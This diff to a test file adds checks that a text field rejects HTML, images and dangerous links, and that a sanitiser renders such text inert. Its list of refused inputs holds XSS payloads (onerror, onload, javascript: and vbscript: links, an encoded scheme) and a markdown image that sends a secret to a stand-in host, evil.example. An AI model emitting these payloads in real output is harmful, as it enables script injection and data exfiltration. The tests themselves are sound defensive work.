@@ -1,5 +1,6 @@
 import { readFileSync } from "node:fs";
 import { describe, expect, test } from "bun:test";
+import { inertFallbackText } from "../src/display/fallback";
 import {
   checkShowInput,
   noteInputSchema,
@@ -368,6 +369,55 @@ describe("what the engine writes from block data is inert text in every client (
     const said = r.ok ? "" : `${r.error.message} ${r.error.hint ?? ""}`;
     expect(said).not.toContain("![");
     expect(said).not.toContain("://");
+  });
+});
+
+describe("the model's fallback is never HTML, an image or a dangerous link, by check and by construction (review 2, finding 2)", () => {
+  const refused = [
+    // the review's
+    "<img/src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "<details/open/ontoggle=alert(1)>",
+    "![chart][1]\n\n[1]: https://evil.example/p.png?d=secret",
+    // ours
+    "<!-- hidden -->",
+    "<![CDATA[x]]>",
+    "<?php echo 1 ?>",
+    "</p>",
+    "<a\nhref=x>link</a>",
+    "![chart]\n\n[chart]: https://evil.example/p.png",
+    "![chart] [1]",
+    "[details](javascript:alert(1))",
+    "[details](JaVaScRiPt:alert(1))",
+    "[details]( data:text/html;base64,PHNjcmlwdD4=)",
+    "[details](&#106;avascript:alert(1))",
+    "[details](vbscript:msgbox(1))",
+    "\n\n[ref]: javascript:alert(1)",
+    "<javascript:alert(1)>",
+    "<https://evil.example/autolink>",
+  ];
+  for (const payload of refused) {
+    test(`refused: ${JSON.stringify(payload)}`, () => {
+      const r = checkShowInput(show({ fallback: { text: `${FALLBACK} ${payload}` } }));
+      expect(r.ok ? null : [r.error.code, r.error.path]).toEqual(["VALIDATION_FAILED", "fallback.text"]);
+    });
+  }
+
+  test("allowed: http(s) and relative links, and a comparison; stored with every < as an entity", () => {
+    const text = `${FALLBACK} See [the report](https://example.com/r) and [PO 4471](po/4471). Stock 3 < 5 and 7 > 2.`;
+    const r = checkShowInput(show({ fallback: { text } }));
+    expect(r.ok && r.show.fallback).toBe(text.replace("3 < 5", "3 &lt; 5"));
+  });
+
+  test("by construction: whatever the checks become, the stored text cannot open a tag, show an image or link to another scheme", () => {
+    for (const payload of refused) {
+      const out = inertFallbackText(payload);
+      expect(out).not.toContain("<");
+      expect(out).not.toContain("![");
+      expect(out).not.toMatch(/\]\(\s*(?!https?:\/\/)[^)\s]*[:&]/i);
+      expect(out).not.toMatch(/^ {0,3}\[[^\]]+\]:\s*(?!https?:\/\/)\S*[:&]/im);
+    }
+    expect(inertFallbackText("[ok](https://example.com) [rel](po/1)")).toBe("[ok](https://example.com) [rel](po/1)");
   });
 });
 
